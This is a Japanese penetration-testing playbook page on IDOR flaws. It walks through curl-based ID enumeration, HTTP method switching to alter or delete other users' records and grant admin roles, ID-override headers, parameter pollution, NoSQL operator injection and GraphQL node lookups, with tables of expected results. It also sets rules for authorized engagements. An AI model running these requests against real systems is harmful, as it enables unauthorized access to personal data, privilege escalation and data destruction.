# IDOR（Insecure Direct Object Reference）

> **スコープ**: オブジェクト参照に対する認可不備の検出と悪用。ID 確認〜直接 ID 操作〜HTTP メソッド改変〜ID 上書きヘッダー〜HPP / JSON 配列 / NoSQL 演算子〜GraphQL 経路までの「認可の穴を探す 4 軸」を扱う。取得したリソース（PCAP / バイナリ / 認証情報）の解析は `../Credential_Discovery.md` / `../Binary_Analysis.md` を参照。

## 着火条件

- URL / リクエストパラメータに連番・数値 ID・ユーザー ID・リソース ID が含まれている
- ファイルダウンロード / 画像参照 / API エンドポイントが ID を受け取る
- 「自分のデータ」を返すエンドポイントが URL / クエリ文字列に ID を含む
- API レスポンスに他ユーザーの ID が漏れている（→ UUID でも ID が取れれば試行可能）

## 環境前提

- 実行環境: テスター端末
- 必要なツール: `curl`（標準搭載）/ `jq`（JSON 抽出）/ Burp Suite（Repeater で挙動確認・全レスポンス横断検索）
- オフライン代替: `curl` + シェルループだけで連番試行・ヘッダー注入は完結する

## 先に確認すること

- **ID 推測よりも漏洩 ID の収集が先**: UUID / GUID は推測困難だが、同アプリの他エンドポイントのレスポンスに他ユーザーの ID が混入することが多い。全レスポンスを Burp で収集し `jq` で ID を一括抽出する
- セッション Cookie / トークンが必要な場合は `-H "Cookie: ..."` / `-H "Authorization: Bearer ..."` を全試行に付ける

**ID の種類別・推測パターン:**

| ID 種別 | 確認方法 | 着眼点 |
|---|---|---|
| 連番整数（`/data/3`）| `0`, `1`, `2` ...と順次試行 | 最小値（0 / 1）に初期データ・管理者データが多い |
| UUID / GUID | 他エンドポイントのレスポンスから漏れた UUID を集める | 他 API の JSON や `Location:` ヘッダーに他ユーザー UUID が混入する |
| タイムスタンプ系（Snowflake / ULID）| 自分の ID の前後 ±1 / 時刻ビット部を変えて試す | 登録順・作成時刻が埋め込まれ前後ユーザーが狙える |
| Base64 エンコード | `echo "3" \| base64`（`Mw==`）→ デコード | エンコードされているだけで内部は整数 ID のことが多い |
| ハッシュ（MD5 / SHA1 系）| 自分のメール / ユーザー名を同じロジックでハッシュ | 固定入力からの計算なら推測可能 |

**攻撃者の思考トレース:** IDOR の本質は「ID を変えるだけ」ではなく「**認可チェックがどこに実装されているか（または実装されていないか）**を探す」作業。メソッドを変える（§3）/ ヘッダーを変える（§4）/ JSON 構造を変える（§5）/ GraphQL 経由に切り替える（§6）の 4 軸で認可の穴を探す。

---

## 1. 自分の ID を確認する

**コマンド:**

```bash
# [Attacker] 自分のアカウントでエンドポイントを叩いて ID を確認
curl -s http://[TARGET]/api/v1/user/profile \
  -H "Authorization: Bearer [MY_TOKEN]" | jq .id

# [Attacker] API レスポンス全体に他ユーザーの ID が漏れていないか確認
curl -s http://[TARGET]/api/v1/feed \
  -H "Authorization: Bearer [MY_TOKEN]" | jq '.. | .user_id? // empty'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 自分の ID が判明（連番）| 連番試行が可能 | §2 直接 ID 操作 |
| feed 等に他ユーザーの ID が混入 | UUID でも標的 ID が取れた | §2 でその ID を直接指定 |
| ID が UUID で漏洩もない | 推測困難 | 他 API / WebSocket / `Location:` / GraphQL イントロスペクションで収集 |

**注意:** UUID は推測困難なので「漏洩 ID の収集」を先に行う。`jq '.. | .["user_id","file_id","id"]? // empty'` で一括抽出すると効率的。

---

## 2. 直接 ID 操作（Classic IDOR）

**コマンド:**

```bash
# [Attacker] 連番 ID を順次試行（ステータス + ボディサイズを見る）
for i in $(seq 0 20); do
  status=$(curl -s -o /tmp/idor_$i -w "%{http_code} %{size_download}" \
    http://[TARGET]/api/v1/data/$i -H "Authorization: Bearer [MY_TOKEN]")
  echo "ID $i : $status"
done
# 自分の ID 以外で 200 + ボディサイズが 0 以上 → IDOR 成立

# [Attacker] ファイルダウンロード系（バイナリ対応）
curl -s http://[TARGET]/download/1 -H "Cookie: session=[MY_SESSION]" -o file_id1 && file file_id1
```

**観測される出力 → 次のアクション:**

| 取得したリソース | 示唆 | 次のアクション |
|--------------|------|--------------|
| 自分以外の ID で 200 + データ | IDOR 成立 | 取得物の種別ごとに展開（下記）|
| PCAP（ネットワークキャプチャ）| 認証情報が含まれる可能性 | tshark で抽出 → `../Credential_Discovery.md` |
| テキスト・設定ファイル / JSON | 認証情報・内部情報 | `../Credential_Discovery.md` |
| バイナリ・実行ファイル | 解析対象 | `../Binary_Analysis.md` |
| 他ユーザーの PII | finding | 取得データの扱いに注意（暗号化保管・破棄）|
| 全て 403 | 認可チェックあり | §3 メソッド改変 / §4 ヘッダー上書きへ |

**注意:** ステータスコードだけでなくレスポンスサイズを見る。`403` でも Body にデータが入っているケースがある（認可チェックと返却処理が分離した実装ミス）。

---

## 3. HTTP メソッド改変

**コマンド:**

```bash
# [Attacker] GET で 403 の場合、他メソッドに切り替えて試行
curl -X PUT  http://[TARGET]/api/v1/users/[TARGET_ID] \
  -H "Authorization: Bearer [MY_TOKEN]" -H "Content-Type: application/json" \
  -d '{"email":"attacker@example.com"}'
curl -X DELETE http://[TARGET]/api/v1/users/[TARGET_ID] -H "Authorization: Bearer [MY_TOKEN]"
curl -X PATCH  http://[TARGET]/api/v1/users/[TARGET_ID] \
  -H "Authorization: Bearer [MY_TOKEN]" -H "Content-Type: application/json" -d '{"role":"admin"}'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| GET 403 だが PUT / PATCH が通る | 書込系メソッドの認可漏れ | role 変更 → 権限昇格 finding → `../../04_Post_Access_Windows_AD/Enumeration_Checklist.md` |
| 全メソッドで 405 | メソッド自体が許可されていない | `curl -X OPTIONS` で許可メソッドを確認 |

**注意:** PUT / DELETE / PATCH で実際にデータを変更した場合は**原状回復必須**（元の値に戻す）。

---

## 4. ID 上書きヘッダーの試行

**コマンド:**

```bash
# [Attacker] 自分のエンドポイントに対してヘッダーでターゲット ID を注入
for hdr in "X-User-Id" "X-Original-User" "X-Forwarded-User" "X-Authenticated-User" \
           "X-User" "X-Custom-User-Id" "X-Remote-User"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    http://[TARGET]/api/v1/me/data \
    -H "Authorization: Bearer [MY_TOKEN]" -H "$hdr: [TARGET_ID]")
  echo "$hdr: $status"
done
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| いずれかのヘッダーで他ユーザーのデータ | プロキシ / 内部転送用ヘッダーの信頼 | そのヘッダーで標的 ID を指定して列挙 |
| 全て変化なし | ヘッダー上書き不可 | §5 HPP / JSON / NoSQL へ |

**注意:** `X-Forwarded-User` / `X-Remote-User` は逆プロキシ前提の内部ヘッダーで、外部から偽装できると認証バイパスになる。

---

## 5. HPP / JSON 配列 / NoSQL 演算子

**コマンド:**

```bash
# [Attacker] HPP — 同名パラメータを 2 個送る
curl -s "http://[TARGET]/api/v1/data?id=[MY_ID]&id=[TARGET_ID]" -H "Authorization: Bearer [MY_TOKEN]"

# [Attacker] JSON 配列インジェクション（スカラーを配列に）
curl -s -X POST http://[TARGET]/api/v1/data \
  -H "Authorization: Bearer [MY_TOKEN]" -H "Content-Type: application/json" \
  -d '{"id": ["[MY_ID]", "[TARGET_ID]"]}'

# [Attacker] NoSQL 演算子注入（MongoDB / Mongoose 等）
curl -s -X POST http://[TARGET]/api/v1/data \
  -H "Authorization: Bearer [MY_TOKEN]" -H "Content-Type: application/json" \
  -d '{"user_id": {"$ne": "[MY_ID]"}}'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| HPP で 2 個目の ID のデータが返る | 検証と実行でパラメータ選択が分裂 | 後勝ち / 先勝ちの挙動を Repeater で固定して悪用 |
| 配列で複数リソースが返る | コレクション全体返却のバグ | 配列に標的 ID を並べて一括取得 |
| `{"$ne": ...}` で全件返る | NoSQL 演算子注入成立 | `{"user_id": {"$gt": 0}}` で全件取得 |
| `{"$ne": ...}` で 400 | RDB バックエンド / サニタイズ済み | §6 GraphQL へ |

**注意:** NoSQL 演算子注入は MongoDB / Mongoose 系で刺さる。RDB バックエンドでは別の攻撃軸へ。

---

## 6. GraphQL 経路

REST で IDOR が防がれていても、GraphQL の `node` インターフェースが ID 直引きになっているケース。

**コマンド:**

```bash
# [Attacker] GraphQL の node インターフェースで ID 直引き
# Global ID は通常 Base64([TypeName]:[integer_id]) の形式
TARGET_GLOBAL_ID=$(echo -n "User:[TARGET_INT_ID]" | base64)
curl -s -X POST http://[TARGET]/graphql \
  -H "Authorization: Bearer [MY_TOKEN]" -H "Content-Type: application/json" \
  -d "{\"query\": \"{ node(id: \\\"$TARGET_GLOBAL_ID\\\") { ... on User { id email role } } }\"}"
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `node(id:)` で他ユーザーの情報が返る | GraphQL 経路の認可漏れ | 各 TypeName で列挙 |
| `null` 返す | global ID の Base64 フォーマット不一致 | `[TypeName]:[ID]` の TypeName をイントロスペクションで確認 |

**注意:** Global ID の TypeName は GraphQL イントロスペクションで確認する。REST と GraphQL で認可ロジックが別実装なことを突く。

---

## 刺さらなかったとき（全体）

| 観測される症状 | 推定原因 | 次の手 |
|---|---|---|
| 自分の ID 以外で全て 403 | 認可チェックが適切に実装 | §3 メソッド改変 / §4 ヘッダー上書き / §5 HPP / JSON 配列 |
| 200 返るが全て自分のデータと同じ | ID と無関係にセッションで返している | リクエスト中のトークン / Cookie の ID 部分を Burp Repeater で確認 |
| ID が UUID で連番推測困難 | 推測不能 | 他 API / WebSocket / `Location:` / イントロスペクションで有効 UUID を収集（§1）|
| GET 403 / PUT / DELETE / PATCH で 405 | メソッド未許可 | `curl -X OPTIONS http://[TARGET]/api/v1/users/[ID]` で許可メソッド確認 |
| GraphQL で `null` | global ID フォーマット不一致 | TypeName をイントロスペクションで確認（§6）|
| `{"$ne": ...}` で 400 / エラー | RDB バックエンド / サニタイズ済み | 他の攻撃軸へ |
| 全試行で 401 | セッション / トークン切れ | 再ログインして Cookie / Bearer 更新後に再試行 |

---

## 注意点・落とし穴

- **ID 推測よりも漏洩 ID の収集が先**（§1 注意参照）
- **ステータスコードだけでなくレスポンスサイズを見る**（§2 注意参照）
- **自分の ID を起点に前後を試す**: タイムスタンプ系 ID は前後数件に意味のあるデータがあることが多い

> **個別ブロック固有の注意は各 §N の「注意:」を参照。**

---

## 本番での前提

- **事前合意の要否**: ★（ID 変更のみなら技術的判断で実施可）/ ★★★（他ユーザーの個人情報取得・権限昇格は書面承認必須）
- **業務影響リスク**: 低（読み取り系のみなら変更なし）。PUT / DELETE で実際に変更した場合は原状回復必須
- **原状回復必須項目**: ✅ HTTP メソッド改変で変更したデータを元の値に戻す
- **取得情報の取扱**: 取得した他ユーザー PII は暗号化保管・テスト完了後破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：Web 列挙で ID を含む URL を発見 → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：Web レスポンスのトリアージで ID 漏洩を検出 → `../../01_Reconnaissance/Web_Response_Triage.md`
- 後：PCAP ファイルが取得できた → `../Credential_Discovery.md`
- 後：バイナリが取得できた → `../Binary_Analysis.md`
- 後：認証バイパス / JWT 操作との連鎖 → `JWT_Attacks.md`
- 関連：パストラバーサル（同じ「ファイルアクセス」系の脆弱性）→ `Path_Traversal.md`
